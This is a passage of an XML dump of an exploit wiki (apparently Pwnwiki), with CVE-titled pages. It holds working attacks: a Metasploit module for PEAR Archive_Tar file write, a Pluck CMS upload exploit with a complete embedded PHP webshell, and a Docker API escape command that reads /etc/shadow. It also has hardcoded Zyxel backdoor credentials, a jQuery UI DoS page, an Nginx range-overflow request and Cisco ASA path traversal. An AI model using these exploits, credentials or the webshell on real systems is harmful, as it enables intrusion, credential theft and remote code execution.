    cantidad_users = Cantidad_Usuarios_Mantis()
    print("Cantidad usuarios en db: "+str(cantidad_users))
    print("Obteniendo Hashes...")
    for x in range(0,int(cantidad_users),1):
        brute_force(Obtener_Id(x))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>sqf0bnvuz71hww9qgp3uig9vptaajrl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28488 jQuery UI 1.12.1 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3226</id>
    <revision>
      <id>3764</id>
      <timestamp>2021-05-31T03:59:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: jQuery UI 1.12.1 - Denial of Service (DoS) # Date: 20 Jan, 2021 # Exploit Author: Rafael Cintra Lopes # Vendor Homepage: https://jqueryui.com/ #..."</comment>
      <origin>3764</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1236" sha1="0dsas3gv5qjmzoa1yfs3uecla2fse5p" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: jQuery UI 1.12.1 - Denial of Service (DoS)
# Date: 20 Jan, 2021
# Exploit Author: Rafael Cintra Lopes
# Vendor Homepage: https://jqueryui.com/
# Software Link: https://jqueryui.com/download/
# Version: &lt;= 1.12.1
# CVE : CVE-2020-28488

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;DoS - jQuery UI 1.12.1&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;DoS - jQuery UI 1.12.1&lt;/h2&gt;

    &lt;div&gt;
        &lt;button onclick="exploit()"&gt;Exploit&lt;/button&gt;
    &lt;/div&gt;

    &lt;p&gt;PoC by Rafael Cintra Lopes&lt;/p&gt;

    &lt;script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"&gt;&lt;/script&gt;
    &lt;script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js" integrity="sha256-VazP97ZCwtekAsvgPBSUwPFKdrwD3unUfSGVYrahUqU=" crossorigin="anonymous"&gt;&lt;/script&gt;

    &lt;script&gt;
        function exploit(){
            for (var i = 0; i &lt; 10; i++) {
                $("div").dialog({title:'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'});
            }
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>0dsas3gv5qjmzoa1yfs3uecla2fse5p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28949 PEAR Archive Tar 任意文件寫入漏洞</title>
    <ns>0</ns>
    <id>3228</id>
    <revision>
      <id>3766</id>
      <timestamp>2021-05-31T04:02:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== This Metasploit module takes advantages of Archive_Tar versions prior to 1.4.11 which fail to validate file stream wrappers contained within filenames to write an arb..."</comment>
      <origin>3766</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2735" sha1="sx14gr4w2a3pahcga72yer9wwvceaob" xml:space="preserve">==INFO==
This Metasploit module takes advantages of Archive_Tar versions prior to 1.4.11 which fail to validate file stream wrappers contained within filenames to write an arbitrary file containing user controlled content to an arbitrary file on disk. Note that the file will be written to disk with the permissions of the user that PHP is running as, so it may not be possible to overwrite some files if the PHP user is not appropriately privileged.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/tar'

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'PEAR Archive_Tar &lt; 1.4.11 Arbitrary File Write',
        'Description' =&gt; %q{
          This module takes advantages of Archive_Tar &lt; 1.4.11's lack of validation of file stream wrappers contained
          within filenames to write an arbitrary file containing user controlled content to an arbitrary file
          on disk. Note that the file will be written to disk with the permissions of the user that PHP is
          running as, so it may not be possible to overwrite some files if the PHP user is not appropriately
          privileged.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'gwillcox-r7', # Metasploit module
            'xorathustra', # Original advisory and PoC
          ],
        'References' =&gt;
          [
            ['URL', 'https://github.com/pear/Archive_Tar/issues/33'],
            ['URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28949'],
            ['CVE', '2020-28949']
          ],
        'DefaultOptions' =&gt;
          {
            'EXITFUNC' =&gt; 'thread',
            'DisablePayloadHandler' =&gt; true
          },
        'Platform' =&gt; ['php'],
        'Arch' =&gt; ARCH_PHP,
        'Targets' =&gt;
          [
            ['Archive_Tar &lt; 1.4.11', {}]
          ],
        'Privileged' =&gt; false,
        'DisclosureDate' =&gt; '2020-11-17'
      )
    )

    register_options([
      OptString.new('FILEPATH', [true, 'The full path to the file to write on the target.', '/tmp/msf.php'])
    ])
  end

  def exploit
    # Create malicious tar archive
    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file "file://#{datastore['FILEPATH']}", 0o644 do |io|
        io.write payload.encoded
      end
    end
    tarfile.rewind
    file_buffer = tarfile.read

    print_status "Writing file: #{datastore['FILENAME']} (#{file_buffer.length} bytes) ..."
    file_create file_buffer
  end
end
&lt;/pre&gt;</text>
      <sha1>sx14gr4w2a3pahcga72yer9wwvceaob</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-29238 ExpressVPN VPN Router 1.0 路由器面板溢出漏洞</title>
    <ns>0</ns>
    <id>1327</id>
    <revision>
      <id>1667</id>
      <timestamp>2021-04-14T09:04:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: ExpressVPN VPN Router 1.0 - Router Login Panel's Integer Overflow # Date: 09-04-2021 # Exploit Author: Jai Kumar Sharma # Vendor Homepage: https..."</comment>
      <origin>1667</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1947" sha1="ils1du0ojt7xd590z7b06tgk6k9ur6r" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: ExpressVPN VPN Router 1.0 - Router Login Panel's Integer Overflow
# Date: 09-04-2021
# Exploit Author: Jai Kumar Sharma
# Vendor Homepage: https://www.expressvpn.com/
# Software Link: https://www.expressvpn.com/vpn-software/vpn-router
# Version: version 1
# Tested on: Windows/Ubuntu/MacOS
# CVE : CVE-2020-29238

*Proof of concept*:

ExpressVPN Router's Login Panel runs on Nginx webserver, the version v1 of the router's firmware hosts web login panel on vulnerable web server

ExpressVPN Summary: A publicly known bug in the Nginx server used by the ExpressVPN Router version 1.x firmware was reported. ExpressVPN no longer ships or supports that version and all users are encouraged to upgrade to the latest version of the ExpressVPN Router firmware available on our site, which is not vulnerable to this bug. Additionally, we highly discourage our users from exposing their router control panel to the Internet, as this class of bug would only be exploitable with access to the control panel, which is usually restricted to the local network. For help or support upgrading your router please visit: https://www.expressvpn.com/support/

ExpressVPN Router version 1 is vulnerable to integer overflow vulnerability in Nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.

Crafted Request:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0)
Gecko/20100101 Firefox/81.0
Host: 127.0.0.1:8181
Accept-Encoding: identity
Range: bytes=-17208,-9223372036854758999
Connection: close


Response:
HTTP/1.1 206 Partial Content
Server: nginx/1.9.15
Date: Tue, 10 Nov 2020 19:22:05 GMT
Content-Type: multipart/byteranges; boundary=00000000002
Content-Length: 598
Last-Modified: Thu, 13 Sep 2018 04:55:28 GMT
Connection: close
ETag: "5b99edc0-99f"


--00000000002
Content-Type: text/html
Content-Range: bytes -14745-2462/2463
&lt;/pre&gt;</text>
      <sha1>ils1du0ojt7xd590z7b06tgk6k9ur6r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-29564 Consul Docker images 空密碼登錄漏洞</title>
    <ns>0</ns>
    <id>1521</id>
    <revision>
      <id>1903</id>
      <timestamp>2021-04-27T07:01:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; port="2375" &amp;&amp; protocol=="docker" &lt;/pre&gt;  ==POC== &lt;pre&gt; docker -H &lt;host&gt;:2375 run --rm -it --privileged --net=host -v /:/mnt alpine  File Access: cat /mnt/etc/s..."</comment>
      <origin>1903</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="204" sha1="1uk56vnnwoeoeuhkcxk61fd8fs6iktz" xml:space="preserve">==FOFA==
&lt;pre&gt;
port="2375" &amp;&amp; protocol=="docker"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
docker -H &lt;host&gt;:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

File Access: cat /mnt/etc/shadow
RCE: chroot /mnt
&lt;/pre&gt;</text>
      <sha1>1uk56vnnwoeoeuhkcxk61fd8fs6iktz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-29583 zyxel默認憑據漏洞</title>
    <ns>0</ns>
    <id>265</id>
    <revision>
      <id>412</id>
      <timestamp>2021-03-18T09:48:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Username: zyfwp Password: PrOw!aN_fXp"</comment>
      <origin>412</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="37" sha1="k6al7wf5cb0k40gvlrmzxca0wka6r2m" xml:space="preserve">Username: zyfwp
Password: PrOw!aN_fXp</text>
      <sha1>k6al7wf5cb0k40gvlrmzxca0wka6r2m</sha1>
    </revision>
    <revision>
      <id>413</id>
      <parentid>412</parentid>
      <timestamp>2021-03-18T09:48:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>413</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="38" sha1="1lrre69fkht0qmz1d6m7ojma52n25h2" xml:space="preserve">Username: zyfwp

Password: PrOw!aN_fXp</text>
      <sha1>1lrre69fkht0qmz1d6m7ojma52n25h2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-29607 Pluck CMS 4.7.13 文件上傳&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2787</id>
    <revision>
      <id>3288</id>
      <timestamp>2021-05-26T12:16:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) # Date: 25.05.2021 # Exploit Author: Ron Jost (Hacker5preme) # Vendor Homep..."</comment>
      <origin>3288</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="21681" sha1="lhg7mm3e463zf67y7wc9hyt32648fnx" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
# Date: 25.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://github.com/pluck-cms/pluck
# Software Link: https://github.com/pluck-cms/pluck/releases/tag/4.7.13
# Version: 4.7.13
# Tested on Xubuntu 20.04
# CVE: CVE-2020-29607

'''
Description:
A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin
privileged user to gain access in the host through the "manage files" functionality,
which may result in remote code execution.
'''


'''
Import required modules:
'''
import sys
import requests
import json
import time
import urllib.parse


'''
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]


'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + pluckcmspath
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Authentication:
'''
# Compute Content-Length:
base_content_len = 27
password_encoded = urllib.parse.quote(password, safe='')
password_encoded_len = len(password_encoded.encode('utf-8'))
content_len = base_content_len + password_encoded_len

# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': str(content_len),
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + pluckcmspath + '/login.php',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Construct Data:
body = {
    'cont1': password,
    'bogus': '',
    'submit': 'Log in',
}

# Authenticating:
link_auth = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/login.php'
auth = requests.post(link_auth, headers=header, data=body)
print('')
if 'error' in auth.text:
    print('Password incorrect, please try again:')
    exit()
else:
    print('Authentification was succesfull, uploading webshell')
    print('')


'''
Upload Webshell:
'''
# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------5170699732428994785525662060',
    'Connection': 'close',
    'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Constructing Webshell payload: I'm using p0wny-shell: https://github.com/flozz/p0wny-shell
data = "-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"

# Uploading Webshell:
link_upload = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files'
upload = requests.post(link_upload, headers=header, data=data)


'''
Finish:
'''
print('Uploaded Webshell to: http://' + target_ip + ':' + target_port + pluckcmspath + '/files/shell.phar')
print('')
&lt;/pre&gt;</text>
      <sha1>lhg7mm3e463zf67y7wc9hyt32648fnx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-3452 CISCO ASA任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>1366</id>
    <revision>
      <id>1721</id>
      <timestamp>2021-04-16T11:46:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../ &lt;/pre&gt;  &lt;pre&gt; GET /+CSCOT+/translation-table?type=mst&amp;textdo..."</comment>
      <origin>1721</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1082" sha1="k76v4tzle5yyuu5mhl4n6n6miyace64" xml:space="preserve">==POC==
&lt;pre&gt;
/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../
